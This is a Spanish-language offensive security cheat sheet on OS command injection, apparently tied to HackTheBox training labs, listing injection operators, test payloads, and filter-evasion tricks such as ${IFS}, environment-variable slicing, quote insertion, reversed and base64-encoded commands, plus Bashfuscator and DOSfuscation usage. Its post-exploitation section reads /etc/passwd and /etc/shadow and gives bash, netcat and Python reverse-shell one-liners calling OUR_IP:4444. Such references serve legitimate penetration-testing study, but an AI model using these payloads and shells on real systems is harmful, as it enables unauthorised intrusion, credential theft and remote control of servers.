---
title: "Command Injections"
description: "Operadores, bypass de filtros, blind injection y técnicas de evasión."
sidebar:
  order: 6
  label: "Command Injections"
---
> Inyección de comandos OS cuando el input del usuario se pasa sin sanitizar a funciones de ejecución de sistema. Bypass de filtros de caracteres, espacios y comandos mediante obfuscación.

---


## Operadores de inyección

| Operador | Carácter | URL-encoded | Ejecuta |
|----------|----------|-------------|---------|
| Semicolon | `;` | `%3b` | Ambos |
| Newline | `\n` | `%0a` | Ambos — **frecuentemente no filtrado** |
| Background | `&` | `%26` | Ambos (2º primero) |
| Pipe | `\|` | `%7c` | Solo 2º |
| AND | `&&` | `%26%26` | Ambos (si 1º tiene éxito) |
| OR | `\|\|` | `%7c%7c` | Solo 2º (si 1º falla) |
| Sub-shell | ` `` ` | `%60%60` | Ambos (Linux) |
| Sub-shell | `$()` | `%24%28%29` | Ambos (Linux) |

```bash
# Payloads básicos de prueba
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
|| whoami          # cuando el primer comando falla
127.0.0.1%0awhoami # newline como separador (más difícil de filtrar)
```

---

## Bypass — Frontend (validación JS)

```bash
# Interceptar con Burp → modificar el campo directamente en la request
# 1. Subir request normal (IP válida)
# 2. CTRL+R → Repeater
# 3. Cambiar ip=127.0.0.1 → ip=127.0.0.1; whoami
# 4. CTRL+U → URL encode el payload
# 5. Send

# Alternativa: DevTools → borrar validación JS
# CTRL+SHIFT+C → seleccionar input → borrar onchange="validate(this)"
```

---

## Bypass — Espacios filtrados

```bash
# Técnica 1: Tab (%09) — funciona en Linux y Windows
127.0.0.1%0a%09whoami

# Técnica 2: ${IFS} — IFS es espacio+tab en bash
127.0.0.1%0a${IFS}whoami
cat${IFS}/etc/passwd

# Técnica 3: Brace expansion — sin espacios
{ls,-la}
{cat,/etc/passwd}
127.0.0.1%0a{whoami}

# Combinación con newline + IFS:
127.0.0.1%0a${IFS}cat${IFS}/etc/passwd
```

---

## Bypass — Caracteres filtrados (/ ; . etc.)

### Linux — Variables de entorno

```bash
# Obtener / desde $PATH
echo ${PATH:0:1}          # → /
${PATH:0:1}etc${PATH:0:1}passwd  # → /etc/passwd en el payload

# Obtener ; desde $LS_COLORS
echo ${LS_COLORS:10:1}    # → ;

# Construcción de rutas sin /
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Verificar variables disponibles
printenv    # listar todas las variables de entorno
```

### Linux — Character shifting (cualquier carácter)

```bash
# man ascii → ver tabla ASCII → char anterior al que buscamos
# \ = ASCII 92, antes está [ = ASCII 91
echo $(tr '!-}' '"-~'<<<[)   # → \

# ; = ASCII 59, antes está : = ASCII 58
echo $(tr '!-}' '"-~'<<<:)   # → ;
```

### Windows CMD

```cmd
# Obtener \ desde %HOMEPATH%
echo %HOMEPATH:~6,-11%        # → \

# Con PowerShell
$env:HOMEPATH[0]              # → \
$env:PROGRAMFILES[10]         # → \
```

---

## Bypass — Comandos filtrados

### Comillas (Linux + Windows)

```bash
# Insertar comillas simples o dobles entre caracteres del comando
w'h'o'am'i      # → whoami (funciona en bash y PowerShell)
w"h"o"am"i      # → whoami
c'a't /etc/passwd

# Regla: no mezclar tipos; número de comillas debe ser par
```

### Backslash y $@ (Linux only)

```bash
w\ho\am\i       # backslash ignorado por bash
who$@ami        # $@ ignorado por bash (argumento especial vacío)
```

### Caret ^ (Windows CMD only)

```cmd
who^ami         # → whoami
```

---

## Bypass avanzado — Obfuscación de comandos

### Case manipulation

```bash
# Windows — CMD/PowerShell case-insensitive
WhOaMi
WHOAMI

# Linux — convertir a minúsculas dinámicamente
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# Sin espacios (combinar con IFS):
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

### Reversed commands (Linux)

```bash
# Obtener comando invertido
echo 'whoami' | rev      # → imaohw
echo 'cat /etc/passwd' | rev  # → dwssap/cte/ tac

# Ejecutar el reverso en payload
$(rev<<<'imaohw')
$(rev<<<'dwssap/cte/ tac')

# Windows PowerShell
"whoami"[-1..-20] -join ''       # → imaohw
iex "$('imaohw'[-1..-20] -join '')"
```

### Base64 encoded (Linux)

```bash
# Codificar comando completo (evita caracteres filtrados)
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# Ejecutar decoded en bash (usa <<< para evitar pipe |)
bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# Si "bash" está filtrado: usar sh
sh<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)

# Si "base64" está filtrado: openssl
openssl enc -d -base64<<<Y2F0IC9ldGMvcGFzc3dk | sh
```

### Base64 encoded (Windows PowerShell)

```powershell
# Convertir comando a base64 UTF-16 (requisito de PowerShell)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# → dwBoAG8AYQBtAGkA

# En Linux para generar el payload Windows:
echo -n whoami | iconv -f utf-8 -t utf-16le | base64   # → dwBoAG8AYQBtAGkA

# Ejecutar en PowerShell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

---

## Herramientas de obfuscación automatizada

### Bashfuscator (Linux)

```bash
# Instalar
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

# Usar (payload corto y simple)
cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

# Verificar que funciona
bash -c '<payload_generado>'
```

### DOSfuscation (Windows)

```powershell
# Instalar
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

# Uso interactivo
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1    # → genera payload ofuscado

# También disponible en Pwnbox (pwsh)
```

---

## Detección — Identificar qué está filtrado

```bash
# Probar operadores uno a uno hasta encontrar el que pasa:
127.0.0.1;           # → bloqueado?
127.0.0.1&           # → bloqueado?
127.0.0.1|           # → bloqueado?
127.0.0.1%0a         # newline → ¿pasa?

# Si el operador pasa, añadir espacio:
127.0.0.1%0a whoami  # ¿bloqueado por espacio?

# Si el espacio está filtrado, añadir comando:
127.0.0.1%0a%09whoami  # ¿bloqueado por "whoami"?

# Si el comando está filtrado:
127.0.0.1%0a%09w'h'o'am'i  # comillas → ¿bypasea?
```

---

## Comandos útiles post-explotación

```bash
# Identificación
whoami; id; hostname; uname -a

# Red
ip a; ifconfig; netstat -antp; cat /etc/hosts

# Archivos sensibles
cat /etc/passwd
cat /etc/shadow       # si tenemos permisos
find / -name "*.conf" 2>/dev/null
find / -name "config.php" 2>/dev/null

# Shell reversa desde webshell (si hay conexión saliente)
bash -i >& /dev/tcp/OUR_IP/4444 0>&1
nc -e /bin/bash OUR_IP 4444
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("OUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## Pitfalls / Gotchas

- **Semicolon en Windows CMD** → `;` no funciona como operador en CMD. Usar `&` o `&&`. Sí funciona en PowerShell.
- **Newline `%0a` es el más fiable** → raramente está en blacklists porque es parte de la semántica HTTP. Siempre probarlo primero.
- **`||` requiere que falle el 1º** → si el primer comando tiene éxito, el segundo no se ejecuta. Usar `|| cmd` sin IP para garantizar fallo del ping.
- **`${IFS}` solo en Linux bash** → no funciona en sh o zsh de la misma forma. Verificar la shell del servidor.
- **Obfuscación + filtros de espacio** → al usar técnicas avanzadas como `tr` o `base64`, asegurarse de que no hay espacios en el payload. Usar `%09` o `${IFS}`.
- **Mezcla de comillas** → no mezclar `'` y `"` en la misma palabra. Las comillas deben ser pares.
- **Backslash `\` en blacklist** → si `\` también está filtrado, usar el método de comillas en su lugar.
- **Base64 con `|`** → si el pipe `|` está filtrado, usar `<<<` (herestring) para pasar datos. `bash<<<$(base64 -d<<<...)` evita el pipe.
- **Bashfuscator payload largo** → sin `-s 1 -t 1`, genera payloads de miles de caracteres. Usar siempre las flags para limitar el tamaño.
- **WAF vs filtro de app** → si el error dice "invalid input" dentro del form → filtro de app PHP. Si responde con una página diferente (403, etc.) → WAF. Las técnicas de bypass difieren.

---

## Cheatsheets relacionados

- [Using Web Proxies](/metodologias/web/using-web-proxies/) — interceptar y modificar requests para bypassar validación frontend
- [File Inclusion](/metodologias/web/file-inclusion/) — LFI a veces convierte command injection en RFI
- [Shells & Payloads](/metodologias/exploitation/shells-payloads/) — reverse shells para escalar desde command injection
- [File Upload Attacks](/metodologias/web/file-upload-attacks/) — command injection en el nombre del archivo subido
- [Web Attacks](/metodologias/web/web-attacks/) — SSRF y XXE también pueden llevar a command injection indirecto
